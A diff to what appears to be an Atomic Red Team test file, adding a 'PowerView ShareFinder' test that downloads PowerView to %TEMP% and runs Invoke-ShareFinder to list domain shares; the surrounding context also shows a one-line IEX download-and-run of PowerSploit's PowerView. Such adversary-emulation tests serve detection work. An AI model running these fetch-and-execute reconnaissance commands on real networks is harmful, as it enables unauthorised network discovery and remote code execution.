@@ -101,3 +101,22 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
+- name: PowerView ShareFinder
+  description: PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.
+  supported_platforms:
+  - windows
+  input_arguments:
+    parameters:
+      description: ShareFinder parameter
+      type: String
+      default: -CheckShareAccess
+  dependencies:
+  - description: Invoke-ShareFinder module must exist in %TEMP% directory
+    prereq_command: 'if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}'
+    get_prereq_command: |
+      Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile $env:TEMP\PowerView.ps1
+  executor:
+    command: |
+      Import-Module $env:TEMP\PowerView.ps1
+      Invoke-ShareFinder #{parameters}
+    name: powershell
